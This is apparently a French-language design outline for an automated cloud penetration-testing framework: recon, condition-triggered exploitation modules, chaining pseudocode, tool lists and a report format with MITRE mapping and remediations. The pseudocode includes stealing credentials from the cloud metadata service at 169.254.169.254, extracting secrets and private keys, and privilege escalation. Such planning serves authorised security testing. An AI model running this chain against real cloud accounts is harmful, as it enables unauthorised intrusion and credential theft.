---

## 🧩 STRATÉGIE GÉNÉRALE

```markdown
RECON → PATTERN DETECTION → MODULE TRIGGER → CORRELATION (CVE/CPE/MITRE)
→ MULTI-EXPLOIT → SCRIPT GEN → REPORT

🔁 CYCLE :
1. Enum surface avec tools (ScoutSuite, Prowler, Steampipe)
2. Triggers conditionnels pour IAM / Compute / Storage / API
3. Si plusieurs patterns se croisent → pivot multi-modules
4. Génère un graphe DOT du chemin d’exploitation possible
5. Crée des scripts automatisés batch/psh/bash selon cible
6. Archive outputs dans /output/cloud/<service>/<module>/
```

---

## 📡 ORCHESTRATION PAR MODULE

| Condition | Module déclenché |
|----------|------------------|
| `iam:*` permission suspecte | `engine_cloud_iam()` |
| `lambda` + `env` variables | `engine_cloud_serverless()` |
| `bucket public` ou `ACL*` | `engine_cloud_storage()` |
| `API Gateway` exposée | `engine_cloud_api_gateway()` |
| `metadata IP reachable` | `engine_cloud_metadata_exposure()` |
| `GitHub Actions` + token | `engine_cloud_ci_cd_pipelines()` |
| `Vault` ou `SecretsManager` mal configuré | `engine_cloud_secret_management()` |
| `Cross-Account Role` partagé | `engine_cloud_cross_account()` |
| `CloudWatch disabled + error logs` | `engine_cloud_monitoring()` |
| `high spend rate + no quota limit` | `engine_cloud_billing_abuse()` |

---

## 🔄 CHAÎNAGE MULTI-MODULE (pseudocode)

```python
if IAMRole with AdminPolicy:
    → trigger engine_cloud_iam()
    → scan assume-role + privilege escalation
    → if can access bucket with secrets:
        → trigger engine_cloud_storage()
        → extract .env or config.json

if Lambda env variable = access_key:
    → trigger engine_cloud_serverless()
    → if IAM attached role = escalable:
        → re-pivot to engine_cloud_iam()

if bucket = world-readable:
    → list objects
    → if terraform/.git/config:
        → trigger engine_cloud_infra_as_code()
        → find privateKey → re-pivot to compute

if metadata service exposed:
    → extract token → curl 169.254.169.254
    → if temp key = admin:
        → inject payload via engine_cloud_api_gateway()
```

---

## 🧰 OUTILS INTÉGRÉS

| Domaine | Outils |
|--------|--------|
| IAM    | PACU, PMapper, Enumeration via Steampipe |
| Compute| AWStealth, ssm-exec, ssh-bastion, nimbostratus |
| Storage| s3scanner, gcs_enum, Azure BlobHunter |
| API    | Postman, Burp, OWASP ZAP, Amass |
| Secret | TruffleHog, detect-secrets, aws-nuke, credsweeper |
| CI/CD  | git-all-secrets, gitrob, gitleaks |
| IaC    | tfsec, checkov, terrascan, scout |
| Billing| BillHopper, cloudtracker |
| ML/AI  | Model Injection, Endpoint Overwrite, SageMaker/VertexAI fuzzers |

---

## 🗂 STRUCTURE OUTPUT

```
/output/cloud/<target>/<module>/
    reconnaissance/
    exploit/
    post-exploitation/
    screenshots/
    logs/
    scripts/
    graphs/
    advisory.md
```

---

## 📊 RAPPORT FINAL

- Mapping MITRE ATT&CK Cloud Matrix
- Cartographie des surfaces par provider
- Graphe d’attaque (DOT + PDF)
- Scripts auto-générés batch/powershell/bash
- Recommandations stratégiques et remédiations (CLI + IaC)
- Score final d’exposition critique (par domaine + global)

---
